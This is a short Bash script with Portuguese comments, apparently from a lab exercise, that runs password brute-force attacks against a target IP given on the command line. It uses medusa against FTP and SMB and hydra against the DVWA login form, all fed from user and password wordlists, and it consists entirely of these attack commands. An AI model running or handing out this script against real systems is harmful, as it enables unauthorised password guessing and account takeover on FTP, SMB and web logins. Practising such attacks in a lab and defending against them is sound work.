#!/bin/bash
# Script para executar todos os ataques

if [ -z "$1" ]; then
    echo "Uso: $0 <IP_ALVO>"
    echo "Exemplo: $0 192.168.56.102"
    exit 1
fi

TARGET=$1

echo "========================================="
echo "Iniciando ataques contra $TARGET"
echo "========================================="

# Ataque FTP
echo -e "\n[1/3] Ataque FTP..."
medusa -h $TARGET -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 6

# Ataque SMB
echo -e "\n[2/3] Ataque SMB..."
medusa -h $TARGET -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt -t 4

# Ataque Web
echo -e "\n[3/3] Ataque WEB (DVWA)..."
hydra -L wordlists/users.txt -P wordlists/passwords.txt $TARGET http-post-form \
"/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed"

echo -e "\n========================================="
echo "Ataques concluídos!"
echo "========================================="
